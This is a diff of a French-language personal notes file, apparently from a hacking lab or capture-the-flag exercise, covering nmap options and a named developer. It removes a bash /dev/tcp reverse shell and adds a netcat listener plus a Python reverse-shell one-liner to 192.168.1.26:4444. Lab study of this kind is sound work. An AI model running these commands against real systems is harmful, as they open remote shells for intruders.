@@ -76,14 +76,17 @@ shrek
 # password
 not yet
 
-# localhost 
-- nc -lvp 4444
-- bash -c 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1'
-
 # nmap -sV -sC -O 192.168.1.8
 - -sV : Détecte les versions des services en cours d'exécution.
 - -sC : Utilise des scripts Nmap pour détecter des vulnérabilités connues.
 - -O : Détermine le système d’exploitation (si possible).
+
+# ceci sur la machine physique
+nc -lvnp 4444
+
+# ceci sur la machine virtuelle
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.1.26",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
+
 
 # developer
 - Prénom NOM: Mouhamed DIOUF
